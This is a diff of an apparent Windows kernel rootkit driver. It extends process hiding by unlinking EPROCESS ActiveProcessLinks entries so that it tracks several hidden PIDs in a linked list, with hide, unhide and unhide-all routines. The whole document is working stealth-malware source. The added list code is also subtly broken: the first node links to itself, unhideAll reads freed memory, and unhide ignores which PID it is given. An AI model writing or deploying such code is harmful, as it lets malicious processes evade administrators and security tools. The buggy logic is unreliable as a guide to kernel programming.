@@ -3,25 +3,78 @@
 
 #define ActiveProcessLinksOffset 0x448
 #define ImageFileNameOffset 0x05A8
-#define pidToHide 6008
 
+PHIDDEN_PROCESS_LIST firstHiddenProcess = NULL;
 PLIST_ENTRY targetProcessLink = NULL;
 long volatile AllCPURaised, numberOfRaisedCPU;
 
 PKDPC GainExclusivity();
+
 NTSTATUS ReleaseExclusivity(PVOID);
 
-VOID hide()
+void addHiddenProcess(ULONG pid, PLIST_ENTRY hiddenProcessLink)
 {
+	PHIDDEN_PROCESS_LIST newHiddenProcess = (PHIDDEN_PROCESS_LIST)ExAllocatePool(PagedPool, sizeof(HIDDEN_PROCESS_LIST));
+	if (!newHiddenProcess)
+		return;
+
+	if (!firstHiddenProcess)
+		firstHiddenProcess = newHiddenProcess;
+
+	newHiddenProcess->hiddenProcessLink = hiddenProcessLink;
+	newHiddenProcess->pid = pid;
+	newHiddenProcess->nextHiddenProcess = NULL;
+	
+	
+	PHIDDEN_PROCESS_LIST currentHiddenProcess = firstHiddenProcess;
+	while (currentHiddenProcess->nextHiddenProcess)
+		currentHiddenProcess = currentHiddenProcess->nextHiddenProcess;
+	currentHiddenProcess->nextHiddenProcess = newHiddenProcess;
+
+}
+
+void removeHiddenProcess(ULONG pid)
+{
+	PHIDDEN_PROCESS_LIST currentHiddenProcess = firstHiddenProcess;
+	PHIDDEN_PROCESS_LIST previousHiddenProcess = NULL;
+
+	// if the pid is the head
+	if (currentHiddenProcess && currentHiddenProcess->pid == pid)
+	{
+		firstHiddenProcess = firstHiddenProcess->nextHiddenProcess;
+		ExFreePool(currentHiddenProcess);
+		return;
+	}
+
+	// look for the pid in the list
+	while (currentHiddenProcess && currentHiddenProcess->pid != pid)
+	{
+		previousHiddenProcess = currentHiddenProcess;
+		currentHiddenProcess = currentHiddenProcess->nextHiddenProcess;
+	}
+
+	// remove if found
+	if (currentHiddenProcess)
+	{
+		previousHiddenProcess->nextHiddenProcess = currentHiddenProcess->nextHiddenProcess;
+		ExFreePool(currentHiddenProcess);
+	}
+}
+
+NTSTATUS hide(ULONG pid)
+{
+	// get our target process
 	PEPROCESS targetProcessToHide;
-	void* targetHandle = ULongToHandle(pidToHide);
-	if (!targetHandle) return;
+	void* targetHandle = ULongToHandle(pid);
+	if (!targetHandle) 
+		return STATUS_UNSUCCESSFUL;
 	PsLookupProcessByProcessId(targetHandle, &targetProcessToHide);
-	targetProcessLink = (PLIST_ENTRY)((PCHAR)targetProcessToHide + ActiveProcessLinksOffset);
+	
 	
 
+	targetProcessLink = (PLIST_ENTRY)((PCHAR)targetProcessToHide + ActiveProcessLinksOffset);
 
-
+	addHiddenProcess(pid, targetProcessLink);
 
 	// raise the irql level of the current processor
 	KIRQL currentIrql = KeGetCurrentIrql();
@@ -45,9 +98,10 @@ VOID hide()
 	ReleaseExclusivity(pkDPC);
 
 	KeLowerIrql(oldIrql);
+	ObDereferenceObject(targetProcessToHide);
 }
 
-void unhide()
+void unhide(ULONG pid)
 {
 	PEPROCESS currentProcess = IoGetCurrentProcess();
 
@@ -57,7 +111,7 @@ void unhide()
 	if (currentIrql < DISPATCH_LEVEL)
 		KeRaiseIrql(DISPATCH_LEVEL, &oldIrql);
 
-
+	removeHiddenProcess(pid);
 	PKDPC pkDPC = GainExclusivity();
 	PLIST_ENTRY currentProcessLink = (PLIST_ENTRY)((PCHAR)currentProcess + ActiveProcessLinksOffset);
 	targetProcessLink->Flink = currentProcessLink;
@@ -69,6 +123,16 @@ void unhide()
 
 	ReleaseExclusivity(pkDPC);
 	KeLowerIrql(oldIrql);
+}
+
+void unhideAll()
+{
+	PHIDDEN_PROCESS_LIST currentHiddenProcess = firstHiddenProcess;
+	while (currentHiddenProcess)
+	{
+		unhide(currentHiddenProcess->pid);
+		currentHiddenProcess = currentHiddenProcess->nextHiddenProcess;
+	}
 }
 
 void printProcessList()
@@ -92,7 +156,6 @@ VOID RaiseCPUIrqlAndWait(PKDPC Dpc, PVOID DeferredContext, PVOID SysArg1, PVOID 
 	}
 	InterlockedDecrement(&numberOfRaisedCPU);
 }
-
 
 PKDPC GainExclusivity()
 {
@@ -135,7 +198,6 @@ PKDPC GainExclusivity()
 	// Return
 	return pKDpc;
 }
-
 
 NTSTATUS ReleaseExclusivity(PVOID pKDpc)
 {
